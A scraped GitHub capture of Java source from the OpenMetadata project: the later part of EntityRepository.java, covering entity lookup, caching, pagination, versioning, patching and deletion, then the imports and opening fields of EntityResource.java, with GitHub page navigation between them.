 public final T copy(T entity, CreateEntity request, String updatedBy) { EntityReference owner = validateOwner(request.getOwner()); EntityReference domain = validateDomain(request.getDomain()); entity.setId(UUID.randomUUID()); entity.setName(request.getName()); entity.setDisplayName(request.getDisplayName()); entity.setDescription(request.getDescription()); entity.setOwner(owner); entity.setDomain(domain); entity.setTags(request.getTags()); entity.setDataProducts(getEntityReferences(Entity.DATA\_PRODUCT, request.getDataProducts())); entity.setLifeCycle(request.getLifeCycle()); entity.setExtension(request.getExtension()); entity.setUpdatedBy(updatedBy); entity.setUpdatedAt(System.currentTimeMillis()); return entity; }
 public EntityUpdater getUpdater(T original, T updated, Operation operation) { return new EntityUpdater(original, updated, operation); }
 public final T get(UriInfo uriInfo, UUID id, Fields fields) { return get(uriInfo, id, fields, NON\_DELETED, false); }
 /\*\* Used for getting an entity with a set of requested fields \*/ public final T get(UriInfo uriInfo, UUID id, Fields fields, Include include, boolean fromCache) { if (!fromCache) { // Clear the cache and always get the entity from the database to ensure read-after-write consistency CACHE\_WITH\_ID.invalidate(new ImmutablePair<>(entityType, id)); } // Find the entity from the cache. Set all the fields that are not already set T entity = find(id, include); setFieldsInternal(entity, fields); setInheritedFields(entity, fields);
 // Clone the entity from the cache and reset all the fields that are not already set // Cloning is necessary to ensure different threads making a call to this method don't // overwrite the fields of the entity being returned T entityClone = JsonUtils.deepCopy(entity, entityClass); clearFieldsInternal(entityClone, fields); return withHref(uriInfo, entityClone); }
 /\*\* getReference is used for getting the entity references from the entity in the cache. \*/ public final EntityReference getReference(UUID id, Include include) throws EntityNotFoundException { return find(id, include).getEntityReference(); }
 /\*\* \* Find method is used for getting an entity only with core fields stored as JSON without any relational fields set \*/ public T find(UUID id, Include include) throws EntityNotFoundException { try { @SuppressWarnings("unchecked") T entity = (T) CACHE\_WITH\_ID.get(new ImmutablePair<>(entityType, id)); if (include == NON\_DELETED && Boolean.TRUE.equals(entity.getDeleted()) || include == DELETED && !Boolean.TRUE.equals(entity.getDeleted())) { throw new EntityNotFoundException(entityNotFound(entityType, id)); } return entity; } catch (ExecutionException | UncheckedExecutionException e) { throw new EntityNotFoundException(entityNotFound(entityType, id)); } }
 public T getByName(UriInfo uriInfo, String fqn, Fields fields) { return getByName(uriInfo, fqn, fields, NON\_DELETED, false); }
 public final T getByName(UriInfo uriInfo, String fqn, Fields fields, Include include, boolean fromCache) { fqn = quoteFqn ? EntityInterfaceUtil.quoteName(fqn) : fqn; if (!fromCache) { // Clear the cache and always get the entity from the database to ensure read-after-write consistency CACHE\_WITH\_NAME.invalidate(new ImmutablePair<>(entityType, fqn)); } // Find the entity from the cache. Set all the fields that are not already set T entity = findByName(fqn, include); setFieldsInternal(entity, fields); setInheritedFields(entity, fields);
 // Clone the entity from the cache and reset all the fields that are not already set // Cloning is necessary to ensure different threads making a call to this method don't // overwrite the fields of the entity being returned T entityClone = JsonUtils.deepCopy(entity, entityClass); clearFieldsInternal(entityClone, fields); return withHref(uriInfo, entityClone); }
 public final EntityReference getReferenceByName(String fqn, Include include) { fqn = quoteFqn ? EntityInterfaceUtil.quoteName(fqn) : fqn; return findByName(fqn, include).getEntityReference(); }
 public T findByNameOrNull(String fqn, Include include) { try { return findByName(fqn, include); } catch (EntityNotFoundException e) { return null; } }
 /\*\* \* Find method is used for getting an entity only with core fields stored as JSON without any relational fields set \*/ public T findByName(String fqn, Include include) { fqn = quoteFqn ? EntityInterfaceUtil.quoteName(fqn) : fqn; try { @SuppressWarnings("unchecked") T entity = (T) CACHE\_WITH\_NAME.get(new ImmutablePair<>(entityType, fqn)); if (include == NON\_DELETED && Boolean.TRUE.equals(entity.getDeleted()) || include == DELETED && !Boolean.TRUE.equals(entity.getDeleted())) { throw new EntityNotFoundException(entityNotFound(entityType, fqn)); } return entity; } catch (ExecutionException | UncheckedExecutionException e) { throw new EntityNotFoundException(entityNotFound(entityType, fqn)); } }
 public final List<T> listAll(Fields fields, ListFilter filter) { // forward scrolling, if after == null then first page is being asked List<String> jsons = dao.listAfter(filter, Integer.MAX\_VALUE, ""); List<T> entities = new ArrayList<>(); for (String json : jsons) { T entity = setFieldsInternal(JsonUtils.readValue(json, entityClass), fields); entity = clearFieldsInternal(entity, fields); entities.add(entity); } return entities; }
 public ResultList<T> listAfter(UriInfo uriInfo, Fields fields, ListFilter filter, int limitParam, String after) { int total = dao.listCount(filter); List<T> entities = new ArrayList<>(); if (limitParam > 0) { // forward scrolling, if after == null then first page is being asked List<String> jsons = dao.listAfter(filter, limitParam + 1, after == null ? "" : RestUtil.decodeCursor(after));
 for (String json : jsons) { T entity = setFieldsInternal(JsonUtils.readValue(json, entityClass), fields); entity = clearFieldsInternal(entity, fields); entities.add(withHref(uriInfo, entity)); }
 String beforeCursor; String afterCursor = null; beforeCursor = after == null ? null : entities.get(0).getName(); if (entities.size() > limitParam) { // If extra result exists, then next page exists - return after cursor entities.remove(limitParam); afterCursor = entities.get(limitParam - 1).getName(); } return getResultList(entities, beforeCursor, afterCursor, total); } else { // limit == 0 , return total count of entity. return getResultList(entities, null, null, total); } }
 public ResultList<T> listAfterWithSkipFailure( UriInfo uriInfo, Fields fields, ListFilter filter, int limitParam, String after) { List<String> errors = new ArrayList<>(); List<T> entities = new ArrayList<>(); int beforeOffset = Integer.parseInt(RestUtil.decodeCursor(after)); int currentOffset = beforeOffset; int total = dao.listCount(filter); if (limitParam > 0) { // forward scrolling, if after == null then first page is being asked List<String> jsons = dao.listAfterWithOffset(limitParam, currentOffset);
 for (String json : jsons) { try { T entity = setFieldsInternal(JsonUtils.readValue(json, entityClass), fields); entity = clearFieldsInternal(entity, fields); entities.add(withHref(uriInfo, entity)); } catch (Exception e) { LOG.error("Failed in Set Fields for Entity with Json : {}", json); errors.add(String.format("Error Message : %s , %n Entity Json : %s", e.getMessage(), json)); } } currentOffset = currentOffset + limitParam; String newAfter = currentOffset > total ? null : String.valueOf(currentOffset); return getResultList(entities, errors, String.valueOf(beforeOffset), newAfter, total); } else { // limit == 0 , return total count of entity. return getResultList(entities, errors, null, null, total); } }
 public ResultList<T> listBefore(UriInfo uriInfo, Fields fields, ListFilter filter, int limitParam, String before) { // Reverse scrolling - Get one extra result used for computing before cursor List<String> jsons = dao.listBefore(filter, limitParam + 1, RestUtil.decodeCursor(before));
 List<T> entities = new ArrayList<>(); for (String json : jsons) { T entity = setFieldsInternal(JsonUtils.readValue(json, entityClass), fields); entity = clearFieldsInternal(entity, fields); entities.add(withHref(uriInfo, entity)); } int total = dao.listCount(filter);
 String beforeCursor = null; String afterCursor; if (entities.size() > limitParam) { // If extra result exists, then previous page exists - return before cursor entities.remove(0); beforeCursor = entities.get(0).getName(); } afterCursor = entities.get(entities.size() - 1).getName(); return getResultList(entities, beforeCursor, afterCursor, total); }
 public T getVersion(UUID id, String version) { Double requestedVersion = Double.parseDouble(version); String extension = EntityUtil.getVersionExtension(entityType, requestedVersion);
 // Get previous version from version history String json = daoCollection.entityExtensionDAO().getExtension(id, extension); if (json != null) { return JsonUtils.readValue(json, entityClass); } // If requested the latest version, return it from current version of the entity T entity = setFieldsInternal(find(id, ALL), putFields); if (entity.getVersion().equals(requestedVersion)) { return entity; } throw EntityNotFoundException.byMessage( CatalogExceptionMessage.entityVersionNotFound(entityType, id, requestedVersion)); }
 public EntityHistory listVersions(UUID id) { T latest = setFieldsInternal(find(id, ALL), putFields); String extensionPrefix = EntityUtil.getVersionExtensionPrefix(entityType); List<ExtensionRecord> records = daoCollection.entityExtensionDAO().getExtensions(id, extensionPrefix); List<EntityVersionPair> oldVersions = new ArrayList<>(); records.forEach(r -> oldVersions.add(new EntityVersionPair(r))); oldVersions.sort(EntityUtil.compareVersion.reversed());
 final List<Object> allVersions = new ArrayList<>(); allVersions.add(JsonUtils.pojoToJson(latest)); oldVersions.forEach(version -> allVersions.add(version.getEntityJson())); return new EntityHistory().withEntityType(entityType).withVersions(allVersions); }
 public final T create(UriInfo uriInfo, T entity) { entity = withHref(uriInfo, createInternal(entity)); return entity; }
 public final T createInternal(T entity) { prepareInternal(entity, false); return createNewEntity(entity); }
 public void prepareInternal(T entity, boolean update) { validateTags(entity); prepare(entity, update); setFullyQualifiedName(entity); validateExtension(entity); // Domain is already validated }
 public void storeRelationshipsInternal(T entity) { storeOwner(entity, entity.getOwner()); applyTags(entity); storeDomain(entity, entity.getDomain()); storeDataProducts(entity, entity.getDataProducts()); storeRelationships(entity); }
 public T setFieldsInternal(T entity, Fields fields) { entity.setOwner(fields.contains(FIELD\_OWNER) ? getOwner(entity) : entity.getOwner()); entity.setTags(fields.contains(FIELD\_TAGS) ? getTags(entity) : entity.getTags()); entity.setExtension(fields.contains(FIELD\_EXTENSION) ? getExtension(entity) : entity.getExtension()); entity.setDomain(fields.contains(FIELD\_DOMAIN) ? getDomain(entity) : entity.getDomain()); entity.setDataProducts(fields.contains(FIELD\_DATA\_PRODUCTS) ? getDataProducts(entity) : entity.getDataProducts()); entity.setFollowers(fields.contains(FIELD\_FOLLOWERS) ? getFollowers(entity) : entity.getFollowers()); entity.setChildren(fields.contains(FIELD\_CHILDREN) ? getChildren(entity) : entity.getChildren()); entity.setExperts(fields.contains(FIELD\_EXPERTS) ? getExperts(entity) : entity.getExperts()); entity.setReviewers(fields.contains(FIELD\_REVIEWERS) ? getReviewers(entity) : entity.getReviewers()); entity.setVotes(fields.contains(FIELD\_VOTES) ? getVotes(entity) : entity.getVotes()); setFields(entity, fields); return entity; }
 public T clearFieldsInternal(T entity, Fields fields) { entity.setOwner(fields.contains(FIELD\_OWNER) ? entity.getOwner() : null); entity.setTags(fields.contains(FIELD\_TAGS) ? entity.getTags() : null); entity.setExtension(fields.contains(FIELD\_EXTENSION) ? entity.getExtension() : null); entity.setDomain(fields.contains(FIELD\_DOMAIN) ? entity.getDomain() : null); entity.setDataProducts(fields.contains(FIELD\_DATA\_PRODUCTS) ? entity.getDataProducts() : null); entity.setFollowers(fields.contains(FIELD\_FOLLOWERS) ? entity.getFollowers() : null); entity.setChildren(fields.contains(FIELD\_CHILDREN) ? entity.getChildren() : null); entity.setExperts(fields.contains(FIELD\_EXPERTS) ? entity.getExperts() : null); entity.setReviewers(fields.contains(FIELD\_REVIEWERS) ? entity.getReviewers() : null); entity.setVotes(fields.contains(FIELD\_VOTES) ? entity.getVotes() : null); clearFields(entity, fields); return entity; }
 @Transaction public final PutResponse<T> createOrUpdate(UriInfo uriInfo, T updated) { T original = findByNameOrNull(updated.getFullyQualifiedName(), ALL); if (original == null) { // If an original entity does not exist then create it, else update return new PutResponse<>(Status.CREATED, withHref(uriInfo, createNewEntity(updated)), RestUtil.ENTITY\_CREATED); } return update(uriInfo, original, updated); }
 @SuppressWarnings("unused") protected void postCreate(T entity) { if (supportsSearch) { searchRepository.createEntity(entity); } }
 @SuppressWarnings("unused") protected void postUpdate(T original, T updated) { if (supportsSearch) { searchRepository.updateEntity(updated); } }
 @Transaction public PutResponse<T> update(UriInfo uriInfo, T original, T updated) { // Get all the fields in the original entity that can be updated during PUT operation setFieldsInternal(original, putFields);
 // If the entity state is soft-deleted, recursively undelete the entity and it's children if (Boolean.TRUE.equals(original.getDeleted())) { restoreEntity(updated.getUpdatedBy(), entityType, original.getId()); }
 // Update the attributes and relationships of an entity EntityUpdater entityUpdater = getUpdater(original, updated, Operation.PUT); entityUpdater.update(); String change = entityUpdater.fieldsChanged() ? RestUtil.ENTITY\_UPDATED : RestUtil.ENTITY\_NO\_CHANGE; setInheritedFields(updated, new Fields(allowedFields)); return new PutResponse<>(Status.OK, withHref(uriInfo, updated), change); }
 @Transaction public final PatchResponse<T> patch(UriInfo uriInfo, UUID id, String user, JsonPatch patch) { // Get all the fields in the original entity that can be updated during PATCH operation T original = setFieldsInternal(find(id, NON\_DELETED), patchFields); setInheritedFields(original, patchFields);
 // Apply JSON patch to the original entity to get the updated entity T updated = JsonUtils.applyPatch(original, patch, entityClass); updated.setUpdatedBy(user); updated.setUpdatedAt(System.currentTimeMillis());
 prepareInternal(updated, true); populateOwner(updated.getOwner()); restorePatchAttributes(original, updated);
 // Update the attributes and relationships of an entity EntityUpdater entityUpdater = getUpdater(original, updated, Operation.PATCH); entityUpdater.update(); String change = RestUtil.ENTITY\_NO\_CHANGE; if (entityUpdater.fieldsChanged()) { change = RestUtil.ENTITY\_UPDATED; setInheritedFields(original, patchFields); // Restore inherited fields after a change } return new PatchResponse<>(Status.OK, withHref(uriInfo, updated), change); }
 @Transaction public PutResponse<T> addFollower(String updatedBy, UUID entityId, UUID userId) { T entity = find(entityId, NON\_DELETED);
 // Validate follower User user = daoCollection.userDAO().findEntityById(userId); if (Boolean.TRUE.equals(user.getDeleted())) { throw new IllegalArgumentException(CatalogExceptionMessage.deletedUser(userId)); }
 // Add relationship addRelationship(userId, entityId, Entity.USER, entityType, Relationship.FOLLOWS);
 ChangeDescription change = new ChangeDescription().withPreviousVersion(entity.getVersion()); fieldAdded(change, FIELD\_FOLLOWERS, List.of(user.getEntityReference()));
 ChangeEvent changeEvent = new ChangeEvent() .withEntity(entity) .withChangeDescription(change) .withEventType(EventType.ENTITY\_UPDATED) .withEntityType(entityType) .withEntityId(entityId) .withEntityFullyQualifiedName(entity.getFullyQualifiedName()) .withUserName(updatedBy) .withTimestamp(System.currentTimeMillis()) .withCurrentVersion(entity.getVersion()) .withPreviousVersion(change.getPreviousVersion()); entity.setChangeDescription(change); postUpdate(entity, entity); return new PutResponse<>(Status.OK, changeEvent, RestUtil.ENTITY\_FIELDS\_CHANGED); }
 @Transaction public PutResponse<T> updateVote(String updatedBy, UUID entityId, VoteRequest request) { T originalEntity = find(entityId, NON\_DELETED);
 // Validate User User user = daoCollection.userDAO().findEntityByName(FullyQualifiedName.quoteName(updatedBy)); UUID userId = user.getId(); if (Boolean.TRUE.equals(user.getDeleted())) { throw new IllegalArgumentException(CatalogExceptionMessage.deletedUser(userId)); }
 ChangeDescription change = new ChangeDescription().withPreviousVersion(originalEntity.getVersion()); fieldUpdated(change, FIELD\_VOTES, null, request.getUpdatedVoteType());
 // Add or Delete relationship if (request.getUpdatedVoteType() == VoteType.UN\_VOTED) { deleteRelationship(userId, Entity.USER, entityId, entityType, Relationship.VOTED); } else { addRelationship( userId, entityId, Entity.USER, entityType, Relationship.VOTED, JsonUtils.pojoToJson(request.getUpdatedVoteType()), false); }
 setFieldsInternal(originalEntity, new Fields(allowedFields, "votes")); ChangeEvent changeEvent = new ChangeEvent() .withEntity(originalEntity) .withChangeDescription(change) .withEventType(EventType.ENTITY\_UPDATED) .withEntityType(entityType) .withEntityId(entityId) .withEntityFullyQualifiedName(originalEntity.getFullyQualifiedName()) .withUserName(updatedBy) .withTimestamp(System.currentTimeMillis()) .withCurrentVersion(originalEntity.getVersion()) .withPreviousVersion(change.getPreviousVersion()); postUpdate(originalEntity, originalEntity); return new PutResponse<>(Status.OK, changeEvent, RestUtil.ENTITY\_FIELDS\_CHANGED); }
 @Transaction public final DeleteResponse<T> delete(String updatedBy, UUID id, boolean recursive, boolean hardDelete) { DeleteResponse<T> response = deleteInternal(updatedBy, id, recursive, hardDelete); postDelete(response.getEntity()); return response; }
 @Transaction public final DeleteResponse<T> deleteByName(String updatedBy, String name, boolean recursive, boolean hardDelete) { name = quoteFqn ? quoteName(name) : name; DeleteResponse<T> response = deleteInternalByName(updatedBy, name, recursive, hardDelete); postDelete(response.getEntity()); return response; }
 protected void preDelete(T entity, String deletedBy) { // Override this method to perform any operation required after deletion. // For example ingestion pipeline deletes a pipeline in AirFlow. }
 protected void postDelete(T entity) {}
 public void deleteFromSearch(T entity, String changeType) { if (supportsSearch) { if (changeType.equals(RestUtil.ENTITY\_SOFT\_DELETED)) { searchRepository.softDeleteOrRestoreEntity(entity, true); } else { searchRepository.deleteEntity(entity); } } }
 public void restoreFromSearch(T entity) { if (supportsSearch) { searchRepository.softDeleteOrRestoreEntity(entity, false); } }
 @Transaction private DeleteResponse<T> delete(String deletedBy, T original, boolean recursive, boolean hardDelete) { checkSystemEntityDeletion(original); preDelete(original, deletedBy); setFieldsInternal(original, putFields); deleteChildren(original.getId(), recursive, hardDelete, deletedBy);
 String changeType; T updated = get(null, original.getId(), putFields, ALL, false); if (supportsSoftDelete && !hardDelete) { updated.setUpdatedBy(deletedBy); updated.setUpdatedAt(System.currentTimeMillis()); updated.setDeleted(true); EntityUpdater updater = getUpdater(original, updated, Operation.SOFT\_DELETE); updater.update(); changeType = RestUtil.ENTITY\_SOFT\_DELETED; } else { cleanup(updated); changeType = RestUtil.ENTITY\_DELETED; } LOG.info("{} deleted {}", hardDelete ? "Hard" : "Soft", updated.getFullyQualifiedName()); return new DeleteResponse<>(updated, changeType); }
 @Transaction public final DeleteResponse<T> deleteInternalByName( String updatedBy, String name, boolean recursive, boolean hardDelete) { // Validate entity T entity = findByName(name, ALL); return delete(updatedBy, entity, recursive, hardDelete); }
 @Transaction public final DeleteResponse<T> deleteInternal(String updatedBy, UUID id, boolean recursive, boolean hardDelete) { // Validate entity T entity = find(id, ALL); return delete(updatedBy, entity, recursive, hardDelete); }
 @Transaction private void deleteChildren(UUID id, boolean recursive, boolean hardDelete, String updatedBy) { // If an entity being deleted contains other \*\*non-deleted\*\* children entities, it can't be deleted List<EntityRelationshipRecord> childrenRecords = daoCollection .relationshipDAO() .findTo(id, entityType, List.of(Relationship.CONTAINS.ordinal(), Relationship.PARENT\_OF.ordinal()));
 if (childrenRecords.isEmpty()) { LOG.info("No children to delete"); return; } // Entity being deleted contains children entities if (!recursive) { throw new IllegalArgumentException(CatalogExceptionMessage.entityIsNotEmpty(entityType)); } // Delete all the contained entities for (EntityRelationshipRecord entityRelationshipRecord : childrenRecords) { LOG.info( "Recursively {} deleting {} {}", hardDelete ? "hard" : "soft", entityRelationshipRecord.getType(), entityRelationshipRecord.getId()); Entity.deleteEntity( updatedBy, entityRelationshipRecord.getType(), entityRelationshipRecord.getId(), true, hardDelete); } }
 @Transaction protected void cleanup(T entityInterface) { UUID id = entityInterface.getId();
 // Delete all the relationships to other entities daoCollection.relationshipDAO().deleteAll(id, entityType);
 // Delete all the field relationships to other entities daoCollection.fieldRelationshipDAO().deleteAllByPrefix(entityInterface.getFullyQualifiedName());
 // Delete all the extensions of entity daoCollection.entityExtensionDAO().deleteAll(id);[View remainder of file in raw view](https://github.com/open-metadata/OpenMetadata/raw/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EntityRepository.java)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_a5d8fbce_20250111_083600.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fblob%2Fb6b337e09a05101506a5faba4b45d370cc3c9fc8%2Fopenmetadata-service%2Fsrc%2Fmain%2Fjava%2Forg%2Fopenmetadata%2Fservice%2Fresources%2FEntityResource.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fblob%2Fb6b337e09a05101506a5faba4b45d370cc3c9fc8%2Fopenmetadata-service%2Fsrc%2Fmain%2Fjava%2Forg%2Fopenmetadata%2Fservice%2Fresources%2FEntityResource.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=open-metadata%2FOpenMetadata)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-metadata](/open-metadata)
/
**[OpenMetadata](/open-metadata/OpenMetadata)**
Public

* [Notifications](/login?return_to=%2Fopen-metadata%2FOpenMetadata) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)
* [Star
   5.9k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)

* [Code](/open-metadata/OpenMetadata)
* [Issues
  395](/open-metadata/OpenMetadata/issues)
* [Pull requests
  92](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects
  0](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

Additional navigation options

* [Code](/open-metadata/OpenMetadata)
* [Issues](/open-metadata/OpenMetadata/issues)
* [Pull requests](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

## Files

 b6b337e
## Breadcrumbs

1. [OpenMetadata](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8)
2. /[openmetadata-service](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service)
3. /[src](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src)
4. /[main](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main)
5. /[java](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java)
6. /[org](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org)
7. /[openmetadata](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata)
8. /[service](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service)
9. /[resources](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources)
/
# EntityResource.java

Copy path Blame  Blame
## Latest commit

## History

[History](/open-metadata/OpenMetadata/commits/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/EntityResource.java)343 lines (305 loc) · 15 KB b6b337e
## Breadcrumbs

1. [OpenMetadata](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8)
2. /[openmetadata-service](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service)
3. /[src](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src)
4. /[main](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main)
5. /[java](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java)
6. /[org](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org)
7. /[openmetadata](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata)
8. /[service](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service)
9. /[resources](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources)
/
# EntityResource.java

Top
## File metadata and controls

* Code
* Blame

343 lines (305 loc) · 15 KB[Raw](https://github.com/open-metadata/OpenMetadata/raw/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/EntityResource.java)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343package org.openmetadata.service.resources;
import static org.openmetadata.common.utils.CommonUtil.listOrEmpty;import static org.openmetadata.common.utils.CommonUtil.nullOrEmpty;import static org.openmetadata.schema.type.MetadataOperation.CREATE;import static org.openmetadata.schema.type.MetadataOperation.VIEW\_BASIC;import static org.openmetadata.service.util.EntityUtil.createOrUpdateOperation;
import java.io.IOException;import java.util.HashMap;import java.util.List;import java.util.Map;import java.util.Set;import java.util.TreeSet;import java.util.UUID;import javax.json.JsonPatch;import javax.ws.rs.core.Response;import javax.ws.rs.core.SecurityContext;import javax.ws.rs.core.UriInfo;import lombok.Getter;import lombok.extern.slf4j.Slf4j;import org.openmetadata.schema.EntityInterface;import org.openmetadata.schema.type.EntityHistory;import org.openmetadata.schema.type.EntityReference;import org.openmetadata.schema.type.Include;import org.openmetadata.schema.type.MetadataOperation;import org.openmetadata.schema.type.csv.CsvImportResult;import org.openmetadata.service.Entity;import org.openmetadata.service.OpenMetadataApplicationConfig;import org.openmetadata.service.exception.CatalogExceptionMessage;import org.openmetadata.service.jdbi3.EntityRepository;import org.openmetadata.service.jdbi3.ListFilter;import org.openmetadata.service.security.Authorizer;import org.openmetadata.service.security.policyevaluator.CreateResourceContext;import org.openmetadata.service.security.policyevaluator.OperationContext;import org.openmetadata.service.security.policyevaluator.ResourceContext;import org.openmetadata.service.security.policyevaluator.ResourceContextInterface;import org.openmetadata.service.util.EntityUtil;import org.openmetadata.service.util.EntityUtil.Fields;import org.openmetadata.service.util.RestUtil;import org.openmetadata.service.util.RestUtil.DeleteResponse;import org.openmetadata.service.util.RestUtil.PatchResponse;import org.openmetadata.service.util.RestUtil.PutResponse;import org.openmetadata.service.util.ResultList;
@Slf4jpublic abstract class EntityResource<T extends EntityInterface, K extends EntityRepository<T>> { protected final Class<T> entityClass; protected final String entityType; protected final Set<String> allowedFields; @Getter protected final K repository; protected final Authorizer authorizer; protected final Map<String, MetadataOperation> fieldsToViewOperations = new HashMap<>();
